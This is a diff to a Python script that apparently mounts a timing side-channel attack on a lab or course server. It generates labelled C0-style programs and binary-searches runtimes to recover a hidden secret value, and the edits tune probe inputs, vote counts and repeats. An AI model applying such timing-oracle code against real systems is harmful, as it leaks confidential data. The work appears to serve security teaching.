@@ -955,7 +955,7 @@ def make_array_alloc_timing_program(*, scale: int, mod_base: int) -> str:
     # but runtime work differs due to alloc_array size. No explicit loops/assignments.
     return f"""int main(int input, int secret) {{
   //@label H;
-  int[] A = alloc_array(int, ((input % {mod_base}) + 1) * ({scale}));
+  int[] A = alloc_array(int, (((input % {mod_base}) + {mod_base}) % {mod_base} + 1) * ({scale}));
   //@label H;
   bool burn = (secret < input) && (\\length(A) >= 0);
   return 0;
@@ -972,6 +972,15 @@ def recover_from_timing_oracle(
     debug: bool,
     verify_timeout_s: float,
 ) -> int:
+    def timing_input_for(mid: int, candidate_name: str) -> int:
+        if candidate_name.startswith("alloc-timing-"):
+            # Avoid huge allocation sizes during boundary/binary-search probes.
+            # Preserve endpoint ordering (0 -> low, max -> high) while bounding input.
+            if mid <= SECRET_MIN:
+                return 0
+            return 1 << 20
+        return mid
+
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
@@ -1014,7 +1023,7 @@ def recover_from_timing_oracle(
                     server_command=server_command,
                     userid=userid,
                     program_path=path,
-                    input_value=SECRET_MIN,
+                    input_value=timing_input_for(SECRET_MIN, candidate_name),
                     timeout_s=timeout_s,
                     repeats=calibration_repeats,
                 )
@@ -1022,7 +1031,7 @@ def recover_from_timing_oracle(
                     server_command=server_command,
                     userid=userid,
                     program_path=path,
-                    input_value=SECRET_MAX_EXCLUSIVE,
+                    input_value=timing_input_for(SECRET_MAX_EXCLUSIVE, candidate_name),
                     timeout_s=timeout_s,
                     repeats=calibration_repeats,
                 )
@@ -1049,24 +1058,44 @@ def recover_from_timing_oracle(
 
             threshold = (t_false + t_true) / 2.0
 
+            # Dynamic cost control: some candidates (especially allocation-based ones)
+            # can become very expensive during boundary voting / binary search.
+            classify_repeats = repeats
+            votes_total = 3
+            boundary_checks = 9
+            probe_scale = max(t_false, t_true)
+            if probe_scale > 0.10:
+                classify_repeats = max(1, repeats // 2)
+                votes_total = 1
+                boundary_checks = 3
+            elif probe_scale > 0.07:
+                classify_repeats = max(2, repeats // 2)
+                votes_total = 2
+                boundary_checks = 5
+            debug_log(
+                debug,
+                f"[timing] {candidate_name}: classify-repeats={classify_repeats} "
+                f"votes={votes_total} boundary-checks={boundary_checks}",
+            )
+
             def classify(mid: int) -> bool:
-                # Majority vote improves stability under noisy shared machines.
+                mapped_mid = timing_input_for(mid, candidate_name)
                 votes_true = 0
-                votes_total = 3
                 for _ in range(votes_total):
                     t_mid = median_runtime_for_input(
                         server_command=server_command,
                         userid=userid,
                         program_path=path,
-                        input_value=mid,
+                        input_value=mapped_mid,
                         timeout_s=timeout_s,
-                        repeats=repeats,
+                        repeats=classify_repeats,
                     )
                     if t_mid > threshold:
                         votes_true += 1
-                return votes_true >= 2
+                # ceil(votes_total / 2)
+                return votes_true * 2 >= votes_total
 
-            def boundary_vote(mid: int, checks: int = 9) -> tuple[bool, float]:
+            def boundary_vote(mid: int, checks: int) -> tuple[bool, float]:
                 true_count = 0
                 for _ in range(checks):
                     if classify(mid):
@@ -1076,8 +1105,12 @@ def recover_from_timing_oracle(
                     return True, frac_true
                 return False, 1.0 - frac_true
 
-            boundary_lo, conf_lo = boundary_vote(SECRET_MIN)
-            boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE)
+            boundary_lo, conf_lo = boundary_vote(
+                timing_input_for(SECRET_MIN, candidate_name), boundary_checks
+            )
+            boundary_hi, conf_hi = boundary_vote(
+                timing_input_for(SECRET_MAX_EXCLUSIVE, candidate_name), boundary_checks
+            )
             if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
                 last_failure = (
                     "timing boundary too noisy "
